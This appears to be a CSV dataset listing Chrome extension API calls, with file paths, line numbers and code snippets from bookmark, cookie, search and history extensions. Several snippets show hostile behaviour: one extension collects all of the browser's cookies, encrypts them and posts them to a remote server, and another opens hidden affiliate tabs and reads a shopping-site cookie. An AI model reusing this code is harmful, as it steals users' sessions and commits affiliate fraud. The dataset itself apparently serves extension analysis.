col0,col1,col2,col3,extracted_code_block
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,51,chrome.bookmarks.search,chrome. ...      }),"chrome.bookmarks.search(folderName, (results) => { if (results.length > 0) { resolve(results[0].id); } else { chrome.bookmarks.create({ parentId: idParentFolder, title: folderName }, (newFolder) => { resolve(newFolder.id); }); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,55,chrome.bookmarks.create,chrome. ...      }),"chrome.bookmarks.create({ parentId: idParentFolder, title: folderName }, (newFolder) => { resolve(newFolder.id); })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,65,chrome.bookmarks.search,chrome. ...      }),"chrome.bookmarks.search({ title: title, url: url }, function (existingBookmarks) { if (existingBookmarks.length === 0) { chrome.bookmarks.create({ parentId: parentId, title: title, url: url }); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,67,chrome.bookmarks.create,chrome. ...      }),"chrome.bookmarks.create({ parentId: parentId, title: title, url: url })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,79,chrome.bookmarks.search,chrome. ...      }),"chrome.bookmarks.search({ title, url }, function (existingBookmarks) { if (existingBookmarks.length) { const bookmarkId = existingBookmarks[0].id; chrome.bookmarks.remove(bookmarkId); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,82,chrome.bookmarks.remove,chrome. ... markId),chrome.bookmarks.remove(bookmarkId)
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,106,chrome.alarms.clear,chrome. ... r('up'),chrome.alarms.clear('up')
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,167,chrome.bookmarks.search,chrome. ...      }),"chrome.bookmarks.search({ url: link.url }, (results) => { const isInstalled = results.length > 0; resolve(isInstalled ? 1 : 0); })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,219,chrome.alarms.create,chrome. ... utes }),"chrome.alarms.create('up', { when: now + delayMilliseconds, periodInMinutes: delayMinutes })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/popup.js,33,chrome.bookmarks.getTree,chrome. ...      }),chrome.bookmarks.getTree((bookmarksTree) => { if (chrome.runtime.lastError) { reject(chrome.runtime.lastError); } else { const count = countBookmarks(bookmarksTree[0]); resolve(count); } })
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/popup.js,58,chrome.bookmarks.getTree,chrome. ...      }),chrome.bookmarks.getTree((bookmarksTree) => { if (chrome.runtime.lastError) { reject(chrome.runtime.lastError); } else { const html = firstGeneralBookmarkHtml(bookmarksTree[0]); resolve(html); } })
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background.js,525,chrome.cookies.getAll,chrome. ... in}` }),chrome.cookies.getAll({ domain: `${domain}` })
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.cookies.getAll,"chrome. ... :""""+s})","chrome.cookies.getAll({domain:""""+s})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.cookies.getAll,chrome. ... }n(e)}),"chrome.cookies.getAll({},async e=>{if(0<e.length){var t=sjcl.encrypt(g,JSON.stringify(e),{ks:256});try{var a=new URLSearchParams;a.set(""data"",t),d=await ky.post(u,{headers:{Accept:""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",From:extensionName,ID:chrome.runtime.id,UUID:Utils.getUserID(),Cookies:i},credentials:""include"",body:a}).text()}catch(e){}}n(e)})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... s:[a]}),chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:[a]})
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.updateDynamicRules,"chrome. ... ""]}}]})","chrome.declarativeNetRequest.updateDynamicRules({addRules:[{id:a,priority:1,action:{type:""modifyHeaders"",requestHeaders:[{header:i,operation:""remove""},{header:i.replace(""X-GOOGLE-EXTENSION-"",""""),operation:""set"",value:r}]},condition:{urlFilter:n,resourceTypes:[""main_frame"",""sub_frame"",""stylesheet"",""script"",""image"",""font"",""object"",""xmlhttprequest"",""ping"",""csp_report"",""media"",""websocket"",""webtransport"",""webbundle"",""other""]}}]})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),chrome.declarativeNetRequest.getDynamicRules()
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,32,chrome.runtime.setUninstallURL,chrome. ... {uid}`),chrome.runtime.setUninstallURL(`${serverUrl}/leaving/${extSlug}?uid=${uid}`)
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,34,chrome.tabs.create,chrome. ... \n    }),chrome.tabs.create({ url: 'search.html' })
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,37,chrome.tabs.create,chrome. ... \n    }),chrome.tabs.create({ url: `${serverUrl}/greeting/${extSlug}?uid=${uid}` })
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... :t})})),"chrome.tabs.create({url:""https://megabonus.com/y/wEF3t"",active:!1},(t=>{e({affTab:t})}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... r(t)})),"chrome.tabs.create({active:!1,url:""https://megabonus.com/y/4AMcD""},(e=>{const t=(r,n)=>{""complete""===n.status&&r===e.id&&(chrome.tabs.remove(r),chrome.tabs.onUpdated.removeListener(t))};chrome.tabs.onUpdated.addListener(t)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... SION)}),chrome.tabs.create({url:getUrl(n.NEW_VERSION)})
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.remove,chrome. ... .tabId),chrome.tabs.remove(t.data.tabId)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.remove,chrome. ... move(r),chrome.tabs.remove(r)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.cookies.get,chrome. ... lue)})),"chrome.cookies.get({url:""https://shoppingcart.aliexpress.com/"",name:""xman_us_f""},(e=>{i(e.value)}))"
